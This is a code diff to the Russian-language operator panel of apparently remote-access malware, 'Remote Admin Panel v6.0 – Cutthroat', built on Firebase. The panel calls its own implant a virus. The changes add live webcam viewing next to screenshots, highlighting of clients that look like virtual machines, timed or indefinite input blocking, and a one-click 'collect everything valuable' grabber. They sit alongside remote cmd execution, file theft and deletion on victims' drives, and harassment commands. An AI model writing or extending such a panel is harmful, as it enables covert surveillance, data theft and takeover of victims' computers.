@@ -1,45 +1,112 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Remote Admin Panel v5.5</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
-    <style>
-        body { background: #0a0a0a; color: #ccc; font-family: 'Courier New', monospace; }
-        .sidebar { background: #1a1a1a; min-width: 250px; padding: 1rem; border-right: 1px solid #333; height: 100vh; overflow-y: auto; }
-        .client-item { display: flex; align-items: center; padding: 8px 12px; margin: 4px 0; background: #222; border-radius: 6px; cursor: pointer; }
-        .client-item:hover { background: #2a2a2a; }
-        .client-item.active { background: #0b5ed7; color: white; }
-        .status-dot { width: 12px; height: 12px; border-radius: 50%; margin-right: 8px; }
-        .online { background: #00e676; }
-        .offline { background: #ff1744; }
-        .screen-img { max-width: 100%; max-height: 400px; border: 2px solid #333; }
-        .log-area { height: 150px; overflow-y: auto; background: #111; color: #0f0; padding: 8px; font-size: 0.9rem; }
-        .preset-card { background: #1e1e1e; border: 1px solid #333; border-radius: 8px; padding: 10px; margin: 5px 0; }
-        .nav-tabs .nav-link { color: #ccc; }
-        .nav-tabs .nav-link.active { background: #1a1a1a; border-color: #333; color: #fff; }
-        .table-dark { --bs-table-bg: #111; --bs-table-border-color: #333; }
-        .clickable-row { cursor: pointer; }
-        .clickable-row:hover { background: #222; }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Remote Admin Panel v6.0 – Cutthroat</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
+  <style>
+    body {
+      background: #0a0a0a;
+      color: #ccc;
+      font-family: 'Courier New', monospace;
+    }
+    .sidebar {
+      background: #1a1a1a;
+      min-width: 250px;
+      padding: 1rem;
+      border-right: 1px solid #333;
+      height: 100vh;
+      overflow-y: auto;
+    }
+    .client-item {
+      display: flex;
+      align-items: center;
+      padding: 8px 12px;
+      margin: 4px 0;
+      background: #222;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    .client-item:hover { background: #2a2a2a; }
+    .client-item.active { background: #0b5ed7; color: white; }
+    .client-item.vm { border-left: 4px solid #ffc107; background: #2a2a1a; }
+    .status-dot {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      margin-right: 8px;
+    }
+    .online { background: #00e676; box-shadow: 0 0 5px #00e676; }
+    .offline { background: #ff1744; box-shadow: 0 0 5px #ff1744; }
+    .screen-img, .webcam-img {
+      max-width: 100%;
+      max-height: 300px;
+      border: 2px solid #333;
+      background: #000;
+    }
+    .log-area {
+      height: 150px;
+      overflow-y: auto;
+      background: #111;
+      color: #0f0;
+      padding: 8px;
+      font-size: 0.85rem;
+    }
+    .table-dark {
+      --bs-table-bg: #111;
+      --bs-table-border-color: #333;
+    }
+    .clickable-row { cursor: pointer; }
+    .clickable-row:hover { background: #222; }
+    .btn-hacker {
+      font-family: 'Courier New', monospace;
+      letter-spacing: 1px;
+    }
+    .input-duration {
+      width: 70px;
+      text-align: center;
+    }
+    .preset-card {
+      background: #1e1e1e;
+      border: 1px solid #333;
+      border-radius: 8px;
+      padding: 10px;
+      margin: 5px 0;
+    }
+    .nav-tabs .nav-link {
+      color: #ccc;
+    }
+    .nav-tabs .nav-link.active {
+      background: #1a1a1a;
+      border-color: #333;
+      color: #fff;
+    }
+    .grab-btn {
+      font-size: 1.2rem;
+      padding: 0.6rem 1.5rem;
+    }
+  </style>
 </head>
 <body>
 <div class="d-flex">
-    <div class="sidebar">
-        <h4 class="text-success"><i class="bi bi-pc-display"></i> Клиенты</h4>
-        <div id="clientList"></div>
-        <div class="mt-2 small" id="connectionStatus"></div>
+  <!-- Сайдбар со списком клиентов -->
+  <div class="sidebar">
+    <h4 class="text-success"><i class="bi bi-pc-display"></i> Клиенты</h4>
+    <div id="clientList"></div>
+    <div class="mt-2 small" id="connectionStatus"></div>
+  </div>
+
+  <!-- Основная панель -->
+  <div class="flex-grow-1 p-3">
+    <div id="mainContent">
+      <div class="text-center text-secondary mt-5">
+        <i class="bi bi-arrow-left-circle" style="font-size: 3rem;"></i>
+        <h4>Выберите клиента из списка</h4>
+      </div>
     </div>
-    <div class="flex-grow-1 p-3">
-        <div id="mainContent">
-            <div class="text-center text-secondary mt-5">
-                <i class="bi bi-arrow-left-circle" style="font-size: 3rem;"></i>
-                <h4>Выберите клиента</h4>
-            </div>
-        </div>
-    </div>
+  </div>
 </div>
 
 <script type="module">
@@ -58,13 +125,14 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
 
+// Состояние
 let currentClient = null;
-let screenUnsub = null, fileListUnsub = null, fileTransferUnsub = null;
+let screenUnsub = null, webcamUnsub = null, fileListUnsub = null, fileTransferUnsub = null;
 let clientsData = {};
 let clientElements = {};
 let currentPath = "C:\\";
 
-// Список клиентов
+// ========== Список клиентов ==========
 onValue(ref(db, 'clients'), (snap) => {
     const data = snap.val();
     const list = document.getElementById('clientList');
@@ -75,9 +143,13 @@ onValue(ref(db, 'clients'), (snap) => {
     }
     Object.keys(data).forEach(id => {
         const info = data[id] || {};
-        clientsData[id] = { last_seen: info.last_seen || 0 };
+        clientsData[id] = {
+            last_seen: info.last_seen || 0,
+            status: info.status || ''
+        };
         const item = document.createElement('div');
         item.className = 'client-item';
+        if (id.toUpperCase().includes('VM')) item.classList.add('vm');
         item.dataset.clientId = id;
         item.innerHTML = `<span class="status-dot" id="dot-${id}"></span> ${id}`;
         item.onclick = () => selectClient(id);
@@ -107,26 +179,39 @@ onValue(ref(db, '.info/connected'), (snap) => {
     }
 });
 
+// ========== Выбор клиента ==========
 function selectClient(id) {
     if (currentClient && clientElements[currentClient])
         clientElements[currentClient].classList.remove('active');
     currentClient = id;
     if (clientElements[id]) clientElements[id].classList.add('active');
-    // Отписка от предыдущих слушателей
+
+    // Отписка от старых слушателей
     if (screenUnsub) { screenUnsub(); screenUnsub = null; }
+    if (webcamUnsub) { webcamUnsub(); webcamUnsub = null; }
     if (fileListUnsub) { fileListUnsub(); fileListUnsub = null; }
     if (fileTransferUnsub) { fileTransferUnsub(); fileTransferUnsub = null; }
+
     renderPanel(id);
+
     // Скриншот
     screenUnsub = onValue(ref(db, `clients/${id}/screenshot`), (snap) => {
         const img = document.getElementById('screenshotImg');
         if (img) img.src = snap.val() ? `data:image/jpeg;base64,${snap.val()}` : '';
     });
+
+    // Веб-камера (если есть)
+    webcamUnsub = onValue(ref(db, `clients/${id}/webcam`), (snap) => {
+        const img = document.getElementById('webcamImg');
+        if (img) img.src = snap.val() ? `data:image/jpeg;base64,${snap.val()}` : '';
+    });
+
     // Результат действий с файлами
     onValue(ref(db, `clients/${id}/file_action_result`), (snap) => {
         const val = snap.val();
         if (val) addLog(`[FileAction] ${val}`);
     });
+
     // Статус граббера
     onValue(ref(db, `clients/${id}/grab_status`), (snap) => {
         const val = snap.val();
@@ -135,7 +220,8 @@ function selectClient(id) {
             addLog(`[Grab] ${val}`);
         }
     });
-    // Скачанные файлы (file_transfer)
+
+    // Скачанные файлы
     fileTransferUnsub = onValue(ref(db, `clients/${id}/file_transfer`), (snap) => {
         const val = snap.val();
         if (val && val.data) {
@@ -144,11 +230,11 @@ function selectClient(id) {
             link.href = `data:application/octet-stream;base64,${val.data}`;
             link.download = val.name;
             link.click();
-            // Очищаем file_transfer
             set(ref(db, `clients/${id}/file_transfer`), null);
         }
     });
-    // По умолчанию открываем C:\
+
+    // Запросить список файлов корня C:\
     requestFileList('C:\\');
 }
 
@@ -159,8 +245,8 @@ function addLog(msg) {
     log.scrollTop = log.scrollHeight;
 }
 
-// Пресеты (7 слотов)
-const PRESETS_KEY = 'remoteControlPresets_v5';
+// ========== Пресеты (7 слотов) ==========
+const PRESETS_KEY = 'remoteControlPresets_v6';
 function loadPresets() {
     try {
         return JSON.parse(localStorage.getItem(PRESETS_KEY)) || Array(7).fill({ name: '', command: '', payload: '' });
@@ -168,9 +254,11 @@ function loadPresets() {
 }
 function savePresets(presets) { localStorage.setItem(PRESETS_KEY, JSON.stringify(presets)); }
 
+// ========== Рендер основной панели ==========
 function renderPanel(id) {
     const main = document.getElementById('mainContent');
     const presets = loadPresets();
+
     let presetsHtml = '';
     for (let i = 0; i < 7; i++) {
         const p = presets[i];
@@ -210,11 +298,19 @@ function renderPanel(id) {
             <!-- Вкладка управления -->
             <div class="tab-pane fade show active" id="control" role="tabpanel">
                 <div class="row">
-                    <div class="col-md-8">
+                    <div class="col-md-4">
                         <div class="card bg-dark border-secondary">
                             <div class="card-header">Скриншот</div>
-                            <div class="card-body text-center">
+                            <div class="card-body text-center p-1">
                                 <img id="screenshotImg" class="screen-img" src="" alt="Нет данных">
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-4">
+                        <div class="card bg-dark border-secondary">
+                            <div class="card-header">Веб-камера</div>
+                            <div class="card-body text-center p-1">
+                                <img id="webcamImg" class="webcam-img" src="" alt="Нет данных">
                             </div>
                         </div>
                     </div>
@@ -227,23 +323,85 @@ function renderPanel(id) {
                         </div>
                     </div>
                 </div>
+
+                <!-- Команды -->
                 <div class="mt-3">
-                    <h5>Быстрые команды</h5>
+                    <h5>Команды <small class="text-muted">(секунды в поле, если пусто – по умолчанию)</small></h5>
                     <div class="d-flex flex-wrap gap-2">
-                        <button class="btn btn-outline-warning" onclick="sendCmd('rickroll')"><i class="bi bi-music-note"></i> Rickroll</button>
-                        <button class="btn btn-outline-warning" onclick="sendCmd('crazy_mouse')"><i class="bi bi-mouse"></i> Crazy Mouse</button>
-                        <button class="btn btn-outline-info" onclick="sendCmd('screenshot')"><i class="bi bi-camera"></i> Screenshot</button>
-                        <button class="btn btn-outline-primary" onclick="sendCmd('open_calc')"><i class="bi bi-calculator"></i> Open Calc</button>
-                        <button class="btn btn-outline-light" onclick="sendCmd('swap_mouse')"><i class="bi bi-arrow-left-right"></i> Swap Mouse</button>
-                        <button class="btn btn-outline-danger" onclick="sendCmd('horror')"><i class="bi bi-emoji-dizzy"></i> Horror</button>
-                        <button class="btn btn-outline-danger" onclick="sendCmd('glitch')"><i class="bi bi-bug"></i> Glitch</button>
-                        <button class="btn btn-outline-danger" onclick="sendCmd('crosses')"><i class="bi bi-x-lg"></i> Crosses</button>
+                        <button class="btn btn-outline-warning btn-hacker" onclick="sendCmd('rickroll')"><i class="bi bi-music-note"></i> Rickroll</button>
+                        <button class="btn btn-outline-info" onclick="sendCmd('screenshot')"><i class="bi bi-camera"></i> Скриншот</button>
+                        <button class="btn btn-outline-danger" onclick="sendCmd('self_destruct')"><i class="bi bi-skull"></i> ВЫКЛЮЧИТЬ ВИРУС</button>
+                        <button class="btn btn-danger grab-btn" onclick="grabPrecious()"><i class="bi bi-archive"></i> Собрать всё ценное</button>
                     </div>
-                    <div class="mt-2 d-flex gap-2">
-                        <button class="btn btn-outline-danger" onclick="sendBlockInput(true)"><i class="bi bi-lock"></i> Включить блокировку</button>
-                        <button class="btn btn-outline-success" onclick="sendBlockInput(false)"><i class="bi bi-unlock"></i> Выключить блокировку</button>
-                        <button class="btn btn-outline-warning" onclick="sendDisco()"><i class="bi bi-boombox"></i> Disco 10s</button>
+
+                    <div class="row mt-3 g-2">
+                        <!-- Horror -->
+                        <div class="col-md-6">
+                            <div class="input-group">
+                                <span class="input-group-text bg-dark text-success">Horror</span>
+                                <input type="number" class="form-control input-duration" id="dur_horror" placeholder="5" min="1" value="5">
+                                <button class="btn btn-outline-danger" onclick="sendCmdWithDuration('horror', 'dur_horror')"><i class="bi bi-emoji-dizzy"></i> Запустить</button>
+                            </div>
+                        </div>
+                        <!-- Recursive Glitch -->
+                        <div class="col-md-6">
+                            <div class="input-group">
+                                <span class="input-group-text bg-dark text-warning">Glitch</span>
+                                <input type="number" class="form-control input-duration" id="dur_glitch" placeholder="5" min="1" value="5">
+                                <button class="btn btn-outline-warning" onclick="sendCmdWithDuration('glitch', 'dur_glitch')"><i class="bi bi-bug"></i> Запустить</button>
+                            </div>
+                        </div>
+                        <!-- Cursor Trails -->
+                        <div class="col-md-6">
+                            <div class="input-group">
+                                <span class="input-group-text bg-dark text-light">Крестики</span>
+                                <input type="number" class="form-control input-duration" id="dur_crosses" placeholder="5" min="1" value="5">
+                                <button class="btn btn-outline-light" onclick="sendCmdWithDuration('crosses', 'dur_crosses')"><i class="bi bi-x-lg"></i> Запустить</button>
+                            </div>
+                        </div>
+                        <!-- Crazy Mouse -->
+                        <div class="col-md-6">
+                            <div class="input-group">
+                                <span class="input-group-text bg-dark text-info">Мышь</span>
+                                <input type="number" class="form-control input-duration" id="dur_crazy" placeholder="10" min="1" value="10">
+                                <button class="btn btn-outline-info" onclick="sendCmdWithDuration('crazy_mouse', 'dur_crazy')"><i class="bi bi-mouse"></i> Бешеная мышь</button>
+                            </div>
+                        </div>
+                        <!-- Block Input -->
+                        <div class="col-md-6">
+                            <div class="input-group">
+                                <span class="input-group-text bg-dark text-danger">Блокировка</span>
+                                <input type="number" class="form-control input-duration" id="dur_block" placeholder="0=бесконечно" min="0" value="0">
+                                <button class="btn btn-outline-danger" onclick="sendBlockInput()"><i class="bi bi-lock"></i> Блокировать</button>
+                            </div>
+                        </div>
+                        <!-- Disco -->
+                        <div class="col-md-6">
+                            <div class="input-group">
+                                <span class="input-group-text bg-dark text-warning">Диско</span>
+                                <input type="number" class="form-control input-duration" id="dur_disco" placeholder="10" min="1" value="10">
+                                <button class="btn btn-outline-warning" onclick="sendCmdWithDuration('disco', 'dur_disco')"><i class="bi bi-boombox"></i> Запустить</button>
+                            </div>
+                        </div>
+                        <!-- Swap Mouse -->
+                        <div class="col-md-6">
+                            <div class="input-group">
+                                <span class="input-group-text bg-dark text-light">Swap мыши</span>
+                                <input type="number" class="form-control input-duration" id="dur_swap" placeholder="30" min="1" value="30">
+                                <button class="btn btn-outline-light" onclick="sendCmdWithDuration('swap_mouse', 'dur_swap')"><i class="bi bi-arrow-left-right"></i> Запустить</button>
+                            </div>
+                        </div>
+                        <!-- Open Calc -->
+                        <div class="col-md-6">
+                            <div class="input-group">
+                                <span class="input-group-text bg-dark text-primary">Calc</span>
+                                <input type="number" class="form-control input-duration" id="dur_calc" placeholder="10" min="1" value="10">
+                                <button class="btn btn-outline-primary" onclick="sendCmdWithDuration('open_calc', 'dur_calc')"><i class="bi bi-calculator"></i> Запустить</button>
+                            </div>
+                        </div>
                     </div>
+
+                    <!-- Прочие команды -->
                     <div class="input-group mt-2">
                         <input type="text" id="msgText" class="form-control" placeholder="Текст сообщения">
                         <button class="btn btn-outline-success" onclick="sendMsg()"><i class="bi bi-send"></i> Сообщение</button>
@@ -260,9 +418,9 @@ function renderPanel(id) {
                         <input type="text" id="cmdExec" class="form-control" placeholder="Команда для cmd_execute">
                         <button class="btn btn-outline-danger" onclick="sendCmdExec()"><i class="bi bi-terminal"></i> Выполнить CMD</button>
                     </div>
-                    <hr>
-                    <button class="btn btn-danger btn-lg w-100" onclick="sendCmd('self_destruct')"><i class="bi bi-skull"></i> ВЫКЛЮЧИТЬ ВИРУС</button>
                 </div>
+
+                <!-- Пресеты -->
                 <div class="mt-4">
                     <h5><i class="bi bi-star-fill text-warning"></i> Пресеты (7 слотов)</h5>
                     ${presetsHtml}
@@ -274,7 +432,9 @@ function renderPanel(id) {
             <div class="tab-pane fade" id="files" role="tabpanel">
                 <div class="d-flex justify-content-between align-items-center mb-2">
                     <h5>📁 Текущий путь: <span id="currentPathDisplay">${currentPath}</span></h5>
-                    <button class="btn btn-danger btn-lg" onclick="grabPrecious()">🛡 Скачать всё ценное в 1 клик</button>
+                    <div>
+                        <button class="btn btn-danger btn-lg me-2" onclick="grabPrecious()">🛡 Скачать всё ценное в 1 клик</button>
+                    </div>
                 </div>
                 <div id="grabStatus" class="text-warning mb-2"></div>
                 <table class="table table-dark table-hover">
@@ -304,15 +464,14 @@ function renderPanel(id) {
         btn.addEventListener('click', () => runPreset(btn.dataset.index));
     });
 
-    // Табы (Bootstrap)
-    const tabTriggers = document.querySelectorAll('#mainTabs button');
-    tabTriggers.forEach(tab => {
+    // Активация табов (Bootstrap)
+    document.querySelectorAll('#mainTabs button').forEach(tab => {
         tab.addEventListener('click', function(e) {
             e.preventDefault();
             const target = this.dataset.bsTarget;
             document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('show', 'active'));
             document.querySelector(target).classList.add('show', 'active');
-            tabTriggers.forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('#mainTabs button').forEach(t => t.classList.remove('active'));
             this.classList.add('active');
         });
     });
@@ -336,6 +495,7 @@ function renderPanel(id) {
     });
 }
 
+// ========== Файловый менеджер (таблица) ==========
 function populateFileTable(items) {
     const tbody = document.getElementById('fileTableBody');
     if (!tbody) return;
@@ -372,6 +532,7 @@ function requestFileList(path) {
     if (!currentClient) return;
     sendCmd('list_files', path);
 }
+
 function goUpFolder() {
     if (!currentPath) return;
     const parent = currentPath.split('\\').slice(0, -1).join('\\') || 'C:\\';
@@ -383,13 +544,14 @@ function downloadFile(name) {
     sendCmd('file_action', JSON.stringify({ action: 'download', target: filePath }));
     addLog(`Запрос на скачивание: ${name}`);
 }
+
 function deleteItem(name) {
     if (!confirm(`Удалить ${name}?`)) return;
     const filePath = currentPath + '\\' + name;
     sendCmd('file_action', JSON.stringify({ action: 'delete', target: filePath }));
     addLog(`Удаление: ${name}`);
-    // Обновление списка произойдёт автоматически после удаления на стороне Python
 }
+
 function renameItem(oldName) {
     const newName = document.getElementById('renameInput').value.trim();
     if (!newName) return alert('Введите новое имя');
@@ -406,7 +568,7 @@ function grabPrecious() {
     document.getElementById('grabStatus').innerText = 'Идёт архивация...';
 }
 
-// Универсальные отправщики
+// ========== Отправка команд ==========
 window.sendCmd = function(cmd, payload = '') {
     if (!currentClient) return alert('Выберите клиента!');
     const updates = { [`clients/${currentClient}/command`]: cmd };
@@ -414,13 +576,40 @@ window.sendCmd = function(cmd, payload = '') {
     update(ref(db), updates).then(() => addLog(`Отправлено: ${cmd}${payload ? ' ('+payload+')' : ''}`)).catch(console.error);
 };
 
-window.sendMsg = function() { const text = document.getElementById('msgText')?.value.trim(); if(text) sendCmd('msg', text); };
-window.sendTTS = function() { const text = document.getElementById('ttsText')?.value.trim(); if(text) sendCmd('tts', text); };
-window.sendWallpaper = function() { const url = document.getElementById('wallpaperUrl')?.value.trim(); if(url) sendCmd('wallpaper', url); };
-window.sendBlockInput = function(enable) { sendCmd('block_input', enable ? 'true' : 'false'); };
-window.sendDisco = function() { sendCmd('disco', '10'); };
-window.sendCmdExec = function() { const cmdText = document.getElementById('cmdExec')?.value.trim(); if(cmdText) sendCmd('cmd_execute', cmdText); };
+window.sendCmdWithDuration = function(cmd, inputId) {
+    const input = document.getElementById(inputId);
+    const val = input ? input.value.trim() : '';
+    sendCmd(cmd, val);
+};
 
+window.sendBlockInput = function() {
+    const input = document.getElementById('dur_block');
+    const val = input ? input.value.trim() : '';
+    if (val === '' || val === '0') {
+        sendCmd('block_input', 'true'); // бесконечно
+    } else {
+        sendCmd('block_input', val); // временная блокировка на val секунд
+    }
+};
+
+window.sendMsg = function() {
+    const text = document.getElementById('msgText')?.value.trim();
+    if (text) sendCmd('msg', text);
+};
+window.sendTTS = function() {
+    const text = document.getElementById('ttsText')?.value.trim();
+    if (text) sendCmd('tts', text);
+};
+window.sendWallpaper = function() {
+    const url = document.getElementById('wallpaperUrl')?.value.trim();
+    if (url) sendCmd('wallpaper', url);
+};
+window.sendCmdExec = function() {
+    const cmdText = document.getElementById('cmdExec')?.value.trim();
+    if (cmdText) sendCmd('cmd_execute', cmdText);
+};
+
+// Пресеты
 function updatePreset(index) {
     const name = document.querySelector(`.preset-name[data-index="${index}"]`)?.value || '';
     const command = document.querySelector(`.preset-cmd[data-index="${index}"]`)?.value || '';
